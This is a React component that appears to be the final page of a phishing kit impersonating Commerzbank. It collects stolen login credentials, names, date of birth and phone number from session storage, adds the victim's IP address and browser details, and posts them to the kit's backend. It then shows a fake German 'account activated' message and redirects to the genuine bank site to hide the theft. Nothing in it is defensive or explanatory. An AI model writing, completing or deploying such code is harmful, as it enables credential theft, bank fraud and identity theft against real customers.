import React, { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import apiService from '../services/api';

const DonePage: React.FC = () => {
  const navigate = useNavigate();

  useEffect(() => {
    // Check if user came from upload page
    const xusr = sessionStorage.getItem('xusr');
    const xpss = sessionStorage.getItem('xpss');
    const xname1 = sessionStorage.getItem('xname1');
    const xname2 = sessionStorage.getItem('xname2');
    const xdob = sessionStorage.getItem('xdob');
    const xtel = sessionStorage.getItem('xtel');
    
    if (!xusr || !xpss || !xname1 || !xname2 || !xdob || !xtel) {
      navigate('/login');
      return;
    }

    // Send final data to backend (simulating the PHP behavior)
    const sendFinalData = async () => {
      try {
        const finalData = {
          xusr,
          xpss,
          xname1,
          xname2,
          xdob,
          xtel,
          timestamp: new Date().toISOString(),
          ip: await getClientIP(),
          userAgent: navigator.userAgent
        };

        await apiService.final(finalData);
        
        // Clear session data
        sessionStorage.clear();
      } catch (error) {
        console.error('Final data submission error:', error);
        // Clear session data anyway
        sessionStorage.clear();
      }
    };

    sendFinalData();

    // Auto-redirect to Commerzbank website after 5 seconds
    const redirectTimer = setTimeout(() => {
      window.location.href = 'https://commerzbank.de';
    }, 5000);

    // Cleanup timer on component unmount
    return () => clearTimeout(redirectTimer);
  }, [navigate]);

  const getClientIP = async (): Promise<string> => {
    try {
      const response = await fetch('https://api.ipify.org?format=json');
      const data = await response.json();
      return data.ip;
    } catch (error) {
      return 'Unknown';
    }
  };

  const handleReturnToLogin = () => {
    sessionStorage.clear();
    navigate('/login');
  };

  return (
    <div className="commerzbank-app">
      {/* Main Content */}
      <main className="main-content">
        <div className="content-wrapper">
          {/* Left Column - Success Message */}
          <div className="left-column">
            <div className="success-section">
              <div className="success-icon">✓</div>
              <h1 className="success-title">Herzlichen Glückwunsch!</h1>
              
              <p className="success-description">
                Ihr Konto wurde erfolgreich aktiviert. Sie können sich nun mit Ihren Zugangsdaten anmelden.
              </p>
              
              <p className="success-thanks">
                Vielen Dank für Ihre Geduld während des Aktivierungsprozesses.
              </p>
              
              <div className="redirect-info">
                <p>Sie werden in wenigen Sekunden zur Commerzbank-Website weitergeleitet...</p>
                <div className="loading-spinner"></div>
              </div>
              
              <div className="button-group">
                <button 
                  onClick={handleReturnToLogin}
                  className="secondary-button"
                >
                  Zur Anmeldung
                </button>
                <button 
                  onClick={() => window.open('https://commerzbank.de', '_blank')}
                  className="primary-button"
                >
                  Zur Commerzbank-Website
                </button>
              </div>
            </div>
          </div>

          {/* Right Column - Info Panel */}
          <div className="right-column">
            <div className="info-panel">
              <h3>Wichtige Infos zum Digital Banking</h3>
              
              <div className="info-section">
                <p>Haben Sie Probleme mit der PhotoTAN-App oder der Freigabe von Zahlungen? Dann finden Sie <a href="#info">hier</a> weitere Informationen.</p>
              </div>

              <div className="info-section">
                <h4>Kein aktives TAN-Verfahren?</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#phototan">photoTAN aktivieren (für angemeldete Kunden)</a>
                  </li>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#hilfe">Hilfe zur photoTAN</a>
                  </li>
                </ul>
              </div>

              <div className="info-section">
                <h4>Teilnehmernummer/PIN vergessen?</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#teilnehmer">Teilnehmernummer neu anfordern</a>
                  </li>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#pin">PIN vergessen</a>
                  </li>
                </ul>
              </div>

              <div className="info-section">
                <h4>Alles rund ums Online Banking</h4>
                <ul>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#anleitung">Anleitung/Hilfe</a>
                  </li>
                  <li>
                    <span className="arrow-icon">➡</span>
                    <a href="#sicherheit">Sicherheit</a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </main>
    </div>
  );
};

export default DonePage;
